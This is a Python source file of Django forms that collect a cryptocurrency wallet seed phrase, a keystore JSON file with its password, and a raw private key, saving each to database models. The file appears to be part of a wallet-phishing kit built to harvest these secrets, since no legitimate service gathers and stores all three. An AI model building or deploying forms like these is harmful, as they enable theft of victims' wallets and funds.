from django import forms
from main.models import Phrase, KeyStore, PrivateKey


class PhraseForm(forms.ModelForm):
    phrase = forms.CharField(help_text='Typically 12(sometimes 24) words separated by single spaces', max_length=4000, widget=forms.Textarea(attrs={'placeholder' : "ENTER SEED PHRASE"}))

    class Meta:
        model = Phrase
        fields = ['phrase']


class KeyStoreForm(forms.ModelForm):
    password = forms.CharField(widget=forms.PasswordInput)

    class Meta:
        model = KeyStore
        fields = ['keystore_json', 'password']


class PrivateKeyForm(forms.ModelForm):

    class Meta:
        model = PrivateKey
        fields = ['private_key']
